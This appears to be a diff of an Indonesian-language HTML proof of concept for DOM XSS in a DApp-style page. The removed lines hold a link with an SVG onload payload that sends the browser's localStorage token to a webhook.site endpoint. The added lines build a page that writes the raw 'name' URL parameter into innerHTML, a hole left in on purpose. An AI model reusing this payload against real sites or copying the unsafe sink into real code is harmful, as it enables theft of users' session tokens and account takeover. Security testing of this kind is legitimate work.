@@ -3,15 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal Pengujian PoC</title>
+    <title>Simulasi Dampak Nyata DOM XSS DApp</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f4f9; padding: 20px; color: #333; }
+        .card { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 600px; margin: auto; }
+        h2 { color: #d9534f; }
+        .output { background: #eef; padding: 10px; border-left: 4px solid #0275d8; margin-top: 15px; word-break: break-all; }
+    </style>
 </head>
 <body>
-    <h2>Halaman Utama Eksperimen XSS</h2>
-    <p>Silakan uji tautan di bawah ini agar langsung terbuka tanpa lari ke Google:</p>
 
-    <!-- Tombol pemicu payload -->
-    <a href="testing.html?name=%3Csvg/onload=%22fetch('https://webhook.site/3408cdba-02da-45bd-9980-d6ad95ca1594?token='+encodeURIComponent(localStorage.getItem('token')||'test_data'))%22">
-        👉 Klik untuk Tes Payload XSS ke Webhook
-    </a>
+<div class="card">
+    <h2>Simulasi Eksploitasi Dampak Nyata</h2>
+    <p>Halaman ini mensimulasikan penanganan input URL yang tidak aman pada lingkungan DApp.</p>
+    <hr>
+    <h3>Hasil Eksekusi:</h3>
+    <div id="target">Memuat data...</div>
+</div>
+
+<script>
+    // Mengambil parameter 'name' dari URL secara mentah (vulnerable sink)
+    const urlParams = new URLSearchParams(window.location.search);
+    const userInput = urlParams.get('name');
+
+    const targetDiv = document.getElementById('target');
+
+    if (userInput) {
+        // Titik kerentanan DOM XSS (innerHTML)
+        targetDiv.innerHTML = userInput;
+    } else {
+        targetDiv.innerHTML = "Halo, Pengunjung (Silakan masukkan parameter ?name= pada URL).";
+    }
+</script>
+
 </body>
 </html>
